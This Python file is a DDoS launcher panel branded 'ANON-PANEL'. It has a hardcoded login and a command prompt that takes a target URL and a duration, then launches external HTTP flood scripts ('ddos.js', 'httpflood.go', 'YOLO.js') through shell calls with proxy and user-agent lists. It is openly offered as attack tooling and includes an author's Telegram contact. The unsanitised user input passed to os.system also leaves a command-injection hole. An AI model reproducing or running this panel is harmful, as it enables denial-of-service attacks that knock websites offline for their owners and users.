from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()

def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m
                         
                              WELCOME TO ANON-PANEL
                TYPE THE \033[36m[\033[32mMETHODS\033[36m]\033[36m[\033[32mURL\033[36m]\033[36m[\033[32mTIME\033[36m]  START ATTACK
                         AUTHOR IN TELEGRAM : @NIKTO_R007
                         •   BOMB \033[36m[\033[32mL7\033[36m]    •   FLOOD \033[36m[\033[32mL7\033[36m] 
                         •   SLOW \033[36m[\033[32mL7\033[36m]    •   CF-MB \033[36m[\033[32mL7\033[36m]""")

def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m
	                  WELCOME TO ANON-PANEL
		   	 TYPE \033[36m[\033[32mHELP\033[36m] TO SEE OUR METHODS
                         AUTHOR IN TELEGRAM : @NIKTO_R007⠀
\033[0m""")

	while True:
		sys.stdout.write(f"\x1b]2;[\] Yolo-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;45mANONSEC@NIKTO\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  
		elif sinput == "BOMB" or sinput == "bomb":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f' node ddos.js {url} {time} 10 8')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		elif sinput == "FLOOD" or sinput == "flood":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'go run httpflood.go {url} 15000 get {time} ua.txt ')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()
			
		elif sinput == "SLOW" or sinput == "slow":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				os.system(f'cd L7 && node YOLO.js {url} {time} 64 10 proxy.txt')
				os.system ("clear")
			except ValueError:
				main()
			except IndexError:
				main()

		
 
def login():
	sys.stdout.write(f"\x1b]2;[\] Yolo-Panel :: Online Users: [1] :: Attack Sended: [1/10]\x07")
	os.system('cls' if os.name == 'nt' else 'clear')
	user = "Anonsec"
	passwd = "Nikto"
	username = input("""\033[36m
                         
                              WELCOME TO ANON-PANEL
		BEFORE USE OUR PANEL  LOGIN TO UR ACCOUNT
                          AUTHOR IN TELEGRAM : @NIKTO_R007⠀
						   
\033[36m[\033[32mUSERNAME\033[36m]:\033[0m """)
	password = getpass.getpass(prompt='\033[36m[\033[32mPASSWORD\033[36m]:\033[0m ')
	if username != user or password != passwd:
		print("")
		sys.exit(1)
	elif username == user and password == passwd:
		print("\033[36mSuccessfully Login to ur Account")
		time.sleep(1)
		main()

login()
